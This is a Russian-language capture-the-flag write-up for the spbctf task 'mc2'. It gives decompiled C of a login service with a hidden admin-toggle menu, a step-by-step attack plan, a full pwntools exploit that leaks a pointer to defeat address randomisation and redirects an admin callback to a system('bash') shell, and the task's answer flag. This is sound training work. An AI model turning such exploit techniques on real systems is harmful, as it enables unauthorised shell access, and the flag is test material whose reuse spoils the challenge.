[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn8_mc2)
Описание:
Looks like this program has a backdoor.
`nc 109.233.56.90 11726`
**[mc2.elf](https://pwn.spbctf.ru/files/uaf/mc2/mc2.elf)**

Декомпиляция:
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // r8
  const char *v4; // rax
  account *v5; // rdx
  __int64 is_admin; // r9
  __int64 v8; // [rsp+0h] [rbp-2F0h]
  __int64 v9; // [rsp+8h] [rbp-2E8h]
  __int64 v10; // [rsp+10h] [rbp-2E0h]
  __int64 v11; // [rsp+18h] [rbp-2D8h]
  __int64 v12; // [rsp+20h] [rbp-2D0h]
  int v13; // [rsp+ACh] [rbp-244h]
  unsigned __int8 *admin_data; // [rsp+B0h] [rbp-240h]
  int admin_founded; // [rsp+BCh] [rbp-234h]
  int j; // [rsp+C0h] [rbp-230h]
  unsigned __int8 admin_id; // [rsp+C7h] [rbp-229h] BYREF
  __int64 data; // [rsp+C8h] [rbp-228h]
  int choice; // [rsp+D4h] [rbp-21Ch] BYREF
  int i; // [rsp+D8h] [rbp-218h]
  int founded; // [rsp+DCh] [rbp-214h]
  char v22[256]; // [rsp+E0h] [rbp-210h] BYREF
  char password[268]; // [rsp+1E0h] [rbp-110h] BYREF
  int v24; // [rsp+2ECh] [rbp-4h]

  v24 = 0;
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  add_user("guest", "123456");
  add_admin(99, "vos@vos.uz", admin_action_show_id);
  while ( 1 )
  {
    while ( 1 )
    {
LABEL_2:
      printf("login: ");
      alarm(0x78u);
      if ( !gets(password) )
        return 0;
      founded = 0;
      for ( i = 0; i < COUNT; ++i )
      {
        if ( !ACCOUNTS[i].is_admin && !strcmp(ACCOUNTS[i].data, password) )
        {
          founded = 1;
          break;
        }
      }
      if ( founded )
        break;
      printf("No such user\n");
    }

    printf("password: ");
    alarm(0x78u);
    if ( !gets(password) )
      return 0;
    if ( !strcmp((ACCOUNTS[i].data + 20), password) )
      break;
    printf("Wrong password\n");
  }
  printf("\nWelcome, %s!\n", ACCOUNTS[i].data);


  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              printf("\n1) Change password\n");
              printf("2) Contact admin\n");
              printf("3) Show my neighbors\n");
              printf("4) Register new user\n");
              printf("5) Log out\n");
              printf("6) Exit\n");
              printf("> ");
              alarm(0x78u);


              if ( __isoc99_scanf("%d%*c", &choice) != 1 )
                return 0;
              if ( choice != 1 )
                break;

              data = ACCOUNTS[i].data;
              printf("Current password: ");
              alarm(0x78u);
              if ( !gets(password) )
                return 0;
              if ( !strcmp((data + 20), password) )
              {
                printf("New password: ");
                alarm(0x78u);
                if ( !gets(password) )
                  return 0;
                strncpy((data + 20), password, 0x13u);
                printf("Password changed\n");
              }
              else
              {
                printf("Wrong password\n");
              }
            }
            if ( choice != 2 )
              break;
            printf("Enter level of admin to contact: ");
            alarm(0x78u);
            if ( __isoc99_scanf("%hhd%*c", &admin_id) != 1 )
              return 0;
            admin_founded = 0;
            for ( j = 0; j < COUNT; ++j )
            {
              if ( ACCOUNTS[j].is_admin == 1 )
              {
                admin_data = ACCOUNTS[j].data;
                if ( *admin_data == admin_id )
                {
                  admin_founded = 1;
                  break;
                }
              }
            }
            if ( admin_founded )
            {
              printf("Admin does his action\n");
              (*(admin_data + 1))();
            }
            else
            {
              printf("No admin with this level\n");
            }
          }
          if ( choice != 322424845 )
            break;
          printf("OMG you've got to the backdoor menu!\n\n");
          HIDWORD(v12) = printf("Enter the number of account to make admin / unmake admin: ");
          LODWORD(v12) = alarm(0x78u);
          if ( __isoc99_scanf("%d%*c", &choice) != 1 )
            return 0;
          v4 = "ordinary user";
          LOBYTE(v3) = ACCOUNTS[choice].is_admin == 0;
          ACCOUNTS[choice].is_admin = v3;
          v5 = &ACCOUNTS[choice];
          is_admin = v5->is_admin;
          if ( is_admin )
            v4 = "admin";
          HIDWORD(v11) = printf("It's now %s\n", v4, v5, "admin", v3, is_admin, v8, v9, v10, v11, v12);
        }
        if ( choice != 3 )
          break;
        v13 = 0;
        LODWORD(v11) = printf("Ordinary users:\n");
        while ( v13 < COUNT )
        {
          if ( !ACCOUNTS[v13].is_admin )
            HIDWORD(v10) = printf("%d) %s\n", v13, ACCOUNTS[v13].data);
          ++v13;
        }
      }
      if ( choice != 4 )
        break;
      LODWORD(v10) = printf("New login: ");
      HIDWORD(v9) = alarm(0x78u);
      if ( !gets(password) )
        return 0;
      LODWORD(v9) = printf("Password: ");
      HIDWORD(v8) = alarm(0x78u);
      if ( !gets(v22) )
        return 0;
      add_user(password, v22);
      LODWORD(v8) = printf("Registered\n");
    }
    if ( choice == 5 )
      goto LABEL_2;
  }
  while ( choice != 6 );
  return 0;
}
```

Также есть функция
``` C
int secret_action_launch_shell()
{
  return system("bash");
}
```

План атаки:
1. Зайти под `guest:123456`
2. Через команду `322424845` сделать админа не админом.
3. Посмотреть список юзеров и считать адрес из памяти, обойти рандомизацию памяти.
4. Создать новый аккаунт, где пароль будет `id` и `function` будущего админа. Причём `function` = адрес `secret_action_launch_shell`
5. Через команду `322424845` сделать нового юзера админом.
6. Вызвать функцию `2` и указать `id` созданного юзера, чтобы получить шелл.

Эксплоит:
``` python
def login(io):
    io.sendlineafter(b'login: ', b'guest')
    io.sendlineafter(b'password: ', b'123456')

def leak_function(io):
    io.sendlineafter(b'> ', b'322424845')
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b'> ', b'3')
    
    io.recvuntil(b'1) c')
    leak = io.recvline()[:-1]
    leak_addr = u64(leak.ljust(8, b'\x00'))
    print('Leak addr:', hex(leak_addr))
    return leak_addr

def reg_admin(io, addr):
    io.sendlineafter(b'> ', b'4')
    payload = b'c' + p64(addr)
    io.sendlineafter(b'New login: ', payload)
    io.sendlineafter(b'Password: ', b'qweqew')
    
    io.sendlineafter(b'> ', b'322424845')
    io.sendlineafter(b': ', b'2')

def get_shell(io):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', b'99')
    
show_id_offset = 0x11D0
launch_shell_offset = 0x13A0

io = start()

login(io)
show_id_addr = leak_function(io)
launch_shell_addr = show_id_addr - show_id_offset + launch_shell_offset
reg_admin(io, launch_shell_addr)
get_shell(io)

io.interactive()
```

Запуск:
![{DEFBF63A-7EF1-410A-B04E-B13C759090A6}](../../../../z.%20Images/{DEFBF63A-7EF1-410A-B04E-B13C759090A6}.png)

Ответ: `spbctf{366bcba4eefd6e93e33c2fe7735aa615}`